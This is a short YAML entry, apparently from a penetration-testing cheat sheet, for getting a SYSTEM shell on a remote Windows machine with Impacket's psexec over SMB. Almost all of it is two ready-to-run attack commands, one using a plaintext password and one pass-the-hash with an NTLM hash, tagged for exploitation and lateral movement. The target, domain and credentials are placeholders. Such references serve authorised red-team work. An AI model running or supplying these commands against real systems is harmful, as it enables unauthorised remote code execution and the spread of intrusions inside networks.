---
description: |
  Get a SYSTEM shell on a remote Windows machine using Impacket's psexec.
  Requires local admin credentials on the target.

  Reference values:
    Target IP: 10.10.10.1
    Domain: test.local
    Username: admin
    Password: password123
command: |
  # With password
  impacket-psexec test.local/admin:password123@10.10.10.1

  # With NTLM hash (Pass-the-Hash)
  impacket-psexec test.local/admin@10.10.10.1 -hashes :aad3b435b51404eeaad3b435b51404ee
phase:
  - Exploitation
  - Lateral_Movement
target_os:
  - Windows
services:
  - SMB
ports:
  - "445"
  - "135"
items:
  - Username
  - Password
  - Hash
techniques:
  - Pass-the-Hash
network_position:
  - Internal
references:
  - https://github.com/fortra/impacket
---
